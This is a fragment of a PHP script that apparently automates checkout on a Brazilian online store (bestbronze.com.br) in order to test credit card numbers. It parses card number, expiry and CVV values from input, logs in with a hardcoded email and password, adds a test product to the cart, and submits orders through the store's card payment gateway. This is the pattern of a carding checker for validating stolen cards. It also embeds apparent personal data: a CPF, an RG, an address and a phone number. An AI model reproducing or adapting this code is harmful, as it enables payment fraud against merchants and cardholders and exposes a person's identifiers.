...
//include("produto2.php");
    ...
    function _curl($url,$post="",$usecookie = false) {  
		...
		//	curl_setopt($ch, CURLOPT_REFERER, 'https://www.camuflagemairsoft.com.br/customer/account/login/'); //REFERER DA SEGUNDA CHAMADO
            ...
            print $result = curl_exec ($ch); // print aki
            curl_close ($ch);
            return $result;
    }
                    ...
                    if(is_numeric($col)){
                            switch(strlen($col)){
                                    ...
                                    case 2:
                                            ...
                                            elseif (($col >= 2009) and ($col <= 2027) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))    $ccnum['year'] = checkYear($col,$typey);
                                            break;
                                    case 4:
                                            if (($col >= 2009) and ($col <= 2027) and (isset($ccnum['mon'])))    $ccnum['year'] = checkYear($col,$typey);
                                            elseif ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,2)>= 9) and (substr($col,2,2) <= 2027) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))){
                                            ...
                                            break;
                                    case 6:
                                            if ((substr($col,0,2) >= 1) and (substr($col,0,2) <=12) and (substr($col,2,4)>= 2009) and (substr($col,2,4) <= 2027)){
                            $ccnum['mon'] = checkMon(substr($col,0,2),$typem);
                                                    $ccnum['year'] = checkYear(substr($col,-2),$typey);
                        }
                        break;
    ...
    $post = "login%5Busername%5D=arlindoru%40hotmail.com&login%5Bpassword%5D=todinho1&send=";
    //$ip = getStr($s,'name="xs" value="','"');
	$s = _curl($link2,$post,$cookie);

	$link3 = "http://www.bestbronze.com.br/checkout/cart/add/uenc/aHR0cDovL3d3dy5iZXN0YnJvbnplLmNvbS5ici9wcm9kdXRvLXRlc3RlLmh0bWw,/product/55/?product=55&related_product=&qty=1&return_url=";
    ...
    $link5 = "https://www.bestbronze.com.br/firecheckout/index/saveShippingMethod/";
    $post = "billing_address_id=28602&billing%5Baddress_id%5D=467640&billing%5Bfirstname%5D=arlindo&billing%5Blastname%5D=ruela&billing%5Btipopessoa%5D=Fisica&billing%5Bcpfcnpj%5D=222.233.378-48&billing%5Brg%5D=28391993&billing%5Bempresa%5D=&billing%5Bie%5D=&billing%5Bpostcode%5D=06453-005&billing%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&billing%5Bstreet%5D%5B%5D=281&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&billing%5Bcountry_id%5D=BR&billing%5Bcity%5D=Barueri&billing%5Bregion_id%5D=508&billing%5Bregion%5D=&billing%5Btelephone%5D=(11)%208839-1939&billing%5Bcelular%5D=&billing%5Buse_for_shipping%5D=1&shipping%5Bsame_as_billing%5D=1&shipping_address_id=28602&shipping%5Baddress_id%5D=467641&shipping%5Bfirstname%5D=arlindo&shipping%5Blastname%5D=ruela&shipping%5Bpostcode%5D=06453-005&shipping%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&shipping%5Bstreet%5D%5B%5D=281&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&shipping%5Bcountry_id%5D=BR&shipping%5Bcity%5D=Barueri&shipping%5Bregion_id%5D=508&shipping%5Bregion%5D=&shipping%5Btelephone%5D=(11)%208839-1939&shipping%5Bcelular%5D=&shipping_method=pedroteixeira_correios_41068&coupon%5Bremove%5D=0&coupon%5Bcode%5D=&review=1";
    //$ip = getStr($s,'name="xs" value="','"');
	$s = _curl($link5,$post,$cookie);
	
	$link6 = "https://www.bestbronze.com.br/firecheckout/index/savePayment/";
    $post = "billing_address_id=28602&billing%5Baddress_id%5D=467640&billing%5Bfirstname%5D=arlindo&billing%5Blastname%5D=ruela&billing%5Btipopessoa%5D=Fisica&billing%5Bcpfcnpj%5D=222.233.378-48&billing%5Brg%5D=28391993&billing%5Bempresa%5D=&billing%5Bie%5D=&billing%5Bpostcode%5D=06453-005&billing%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&billing%5Bstreet%5D%5B%5D=281&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&billing%5Bcountry_id%5D=BR&billing%5Bcity%5D=Barueri&billing%5Bregion_id%5D=508&billing%5Bregion%5D=&billing%5Btelephone%5D=(11)%208839-1939&billing%5Bcelular%5D=&billing%5Buse_for_shipping%5D=1&shipping%5Bsame_as_billing%5D=1&shipping_address_id=28602&shipping%5Baddress_id%5D=467641&shipping%5Bfirstname%5D=arlindo&shipping%5Blastname%5D=ruela&shipping%5Bpostcode%5D=06453-005&shipping%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&shipping%5Bstreet%5D%5B%5D=281&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&shipping%5Bcountry_id%5D=BR&shipping%5Bcity%5D=Barueri&shipping%5Bregion_id%5D=508&shipping%5Bregion%5D=&shipping%5Btelephone%5D=(11)%208839-1939&shipping%5Bcelular%5D=&shipping_method=pedroteixeira_correios_41068&payment%5Bmethod%5D=braspag_creditcard&payment%5Btype%5D=CreditCard&payment%5Bcc_owner%5D=&payment%5Bcc_number%5D=&payment%5Bcc_exp_month%5D=&payment%5Bcc_exp_year%5D=&payment%5Bcc_cid%5D=&payment%5Bcc_parcelamento%5D=0&coupon%5Bremove%5D=0&coupon%5Bcode%5D=&review=1";
    //$ip = getStr($s,'name="xs" value="','"');
	$s = _curl($link6,$post,$cookie);
	
	$pay = "https://www.bestbronze.com.br/firecheckout/index/saveOrder/form_key/lpejzFseMcqnifGy/";
	//$s = _curl($pay,"",$cookie);
	//$ip = getStr($s,'name="submission_key" value="','"');
	$post = "billing_address_id=28602&billing%5Baddress_id%5D=467640&billing%5Bfirstname%5D=arlindo&billing%5Blastname%5D=ruela&billing%5Btipopessoa%5D=Fisica&billing%5Bcpfcnpj%5D=222.233.378-48&billing%5Brg%5D=28391993&billing%5Bempresa%5D=&billing%5Bie%5D=&billing%5Bpostcode%5D=06453-005&billing%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&billing%5Bstreet%5D%5B%5D=281&billing%5Bstreet%5D%5B%5D=&billing%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&billing%5Bcountry_id%5D=BR&billing%5Bcity%5D=Barueri&billing%5Bregion_id%5D=508&billing%5Bregion%5D=&billing%5Btelephone%5D=(11)%208839-1939&billing%5Bcelular%5D=&billing%5Buse_for_shipping%5D=1&shipping%5Bsame_as_billing%5D=1&shipping_address_id=28602&shipping%5Baddress_id%5D=467641&shipping%5Bfirstname%5D=arlindo&shipping%5Blastname%5D=ruela&shipping%5Bpostcode%5D=06453-005&shipping%5Bstreet%5D%5B%5D=Cal%C3%A7ada%20das%20An%C3%AAmonas&shipping%5Bstreet%5D%5B%5D=281&shipping%5Bstreet%5D%5B%5D=&shipping%5Bstreet%5D%5B%5D=Condom%C3%ADnio%20Centro%20Comercial%20Alphaville&shipping%5Bcountry_id%5D=BR&shipping%5Bcity%5D=Barueri&shipping%5Bregion_id%5D=508&shipping%5Bregion%5D=&shipping%5Btelephone%5D=(11)%208839-1939&shipping%5Bcelular%5D=&shipping_method=pedroteixeira_correios_41068&payment%5Bmethod%5D=braspag_creditcard&payment%5Btype%5D=CreditCard&payment%5Bcc_owner%5D=Arlindo%20ruela&payment%5Bcc_type%5D=$type&payment%5Bcc_number%5D=$ccn&payment%5Bcc_exp_month%5D=$ccmon&payment%5Bcc_exp_year%5D=$ccyear&payment%5Bcc_cid%5D=$cvv&payment%5Bcc_parcelamento%5D=0&coupon%5Bremove%5D=0&coupon%5Bcode%5D=";
